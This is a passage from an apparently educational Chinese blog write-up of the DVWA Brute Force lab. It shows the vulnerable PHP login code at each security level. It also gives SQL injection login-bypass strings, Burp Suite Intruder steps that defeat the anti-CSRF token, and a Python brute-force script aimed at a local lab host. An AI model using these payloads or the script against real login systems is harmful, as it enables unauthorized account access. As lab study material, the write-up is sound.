details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;登录界面如下：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/1.png" width="300" height="194"></div><p>&emsp;&emsp;源码中使用GET方式获取用户输入的参数，通过sql查询语句，查询用户名和密码是否对应。注意到代码没有对用户输入进行检查，不能防范sql注入攻击。没有对登录次数进行限制，因此也可以实施爆破。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>sql注入绕过</strong><br>&emsp;&emsp;由源码可知，查询正确时才会登录成功，因此我们的用户名至少要正确，密码可以通过sql注入绕过。很多服务器都会使用admin这个用户，我们输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">admin<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过单引号闭合，并使用#注释后面的密码字段。若数据库中有admin用户，则可以正确查询。结果如下：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/2.png" width="300" height="255"></div><p><strong>爆破密码</strong></p><p>&emsp;&emsp;爆破需要使用burpsuit工具，打开burpsuit配置好代理，我们在登录界面输入用户名admin、密码123，burpsuit会抓取该数据包：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/3.png"></div><p>&emsp;&emsp;可以看到我们提交的http头部信息，如session和cookie信息、输入的用户名和密码等。将数据包send to intruder：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/4.png"></div><p>&emsp;&emsp;图中$$包含的部分是Intruder自动识别的变量，我们只需要爆破用户名和密码，只将用户名密码设置为需要破解的变量，其余的都clear。本次实验中我只选取密码字段来爆破：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/5.png"></div><p>&emsp;&emsp;设置好后，点击payloads，load导入我们的密码字典：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/6.png"></div><p>&emsp;&emsp;点击右上角start attack，burpsuit就开始爆破，尝试我们导入的每一个密码，结果如下：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/7.png" width="600" height="262"></div><p>&emsp;&emsp;在爆破时，需要关注length字段，当有一个密码的length与其他都不相同时，就可能是正确的密码。<br>&emsp;&emsp;使用爆破得到的用户名admin和密码password登录，登录成功：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/8.png" width="300" height="275"></div><h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;中级代码中使用mysqli_real_escape_string对输入进行简单过滤，mysqli_real_escape_string(string,connection) 函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义，防止sql注入。<br>&emsp;&emsp;但代码并未对爆破进行限制，可以使用同上流程进行爆破，不同的是当登录错误时，会sleep延时2秒，因此爆破时间会更长。</p><h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;代码中使用stripslashes函数去除字符串中的反斜杠＼，mysqli_real_escape_string函数对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。<br>&emsp;&emsp;由于使用了Anti-CSRF token来抵御CSRF的攻击，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。因此不能像安全级别Low一样简单爆破，需要重新设置。</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;在登录界面输入用户名admin、密码123，burpsuit会抓包：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/1.png"></div><p>&emsp;&emsp;可以看到包中有一个user_token变量，发送到 Intruder ，设置attack type为Pitchfork，清除其他变量，给password和user_token加上变量（美元$符号）：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/2.png"></div><p>&emsp;&emsp;在options中设置线程数为1：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/3.png" width="300" height="226"></div><p>&emsp;&emsp;在options中找到Grep-Extract模块，第一步点击add，会打开如下图界面，第二步点击Refresh response，在下方出现的数据中找到user_token的value，鼠标选中该值并复制，该值之后会用到，选中后其他数据会自动变化，然后点击ok：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/4.png"></div><p>&emsp;&emsp;在options中找到Redirections模块，设置为Always：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/5.png" width="400" height="367"></div><p>&emsp;&emsp;设置payloads。第一个变量为password，因此payloads和之前Low中一样，type为Simple list，load导入我们的密码字典：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/6.png" width="350" height="389"></div><p>&emsp;&emsp;第二个payloads为user_token，type设置为Recursive grep，然后在下方方框中粘贴我们复制的token值：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/7.png" width="350" height="398"></div><p>&emsp;&emsp;右上角start attack，开始爆破，按照length排序，length与其他不同的可能就是匹配值，结果如下：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/8.png" width="600" height="233"></div><p>&emsp;&emsp;除了使用Burpsuit，也可以使用python脚本构造数据包头部来爆破，给出一个脚本如下（脚本来源<a href="https://blog.csdn.net/qq_36119192/article/details/82938424" target="_blank">DVWA之Brute Force(暴力破解)</a>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">header=&#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.71.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://192.168.71.1/DVWA/vulnerabilities/brute/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;security=high; PHPSESSID=ors4oc2dv7hculoj5gasaghcp9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">requrl=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/brute/&quot;</span></span><br><span class="line"> </span><br><span class="line">def get_token(requrl,header):</span><br><span class="line">    response=requests.get(url=requrl,headers=header)</span><br><span class="line">    print (response.status_code,len(response.content))</span><br><span class="line">    soup=BeautifulSoup(response.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    input=soup.form.select(&quot;input[type=&#x27;hidden&#x27;]&quot;)   #返回的是一个list列表</span><br><span class="line">    user_token=input[0][&#x27;value&#x27;]                   #获取用户的token</span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"> </span><br><span class="line">user_token=get_token(requrl,header)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">&quot;C:\\Users\\24107\\Desktop\\password.txt&quot;</span>):</span><br><span class="line">    requrl=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;</span>+line.strip()+<span class="string">&quot;&amp;Login=Login&amp;user_token=&quot;</span>+user_token</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    print (i , <span class="string">&#x27;admin&#x27;</span> ,line.strip(),end=<span class="string">&quot;  &quot;</span>)</span><br><span class="line">    user_token=get_token(requrl,header)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;脚本中的字段是针对我个人电脑上的谷歌浏览器，在自己使用前，先burpsuit抓取一个登陆包，然后按照数据包中的头部数据和顺序替换脚本中的header，还有爆破对象的链接、密码字典存放路径也要记得修改。<br>&emsp;&emsp;结果如下：</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/9.png" width="300" height="462"></div><h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; isset ($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; isset ($_POST[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_POST[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_POST[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>;</span><br><span class="line">    $lockout_time       = <span class="number">15</span>;</span><br><span class="line">    $account_locked     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        $last_login = strtotime( $row[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * <span class="number">60</span>);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; 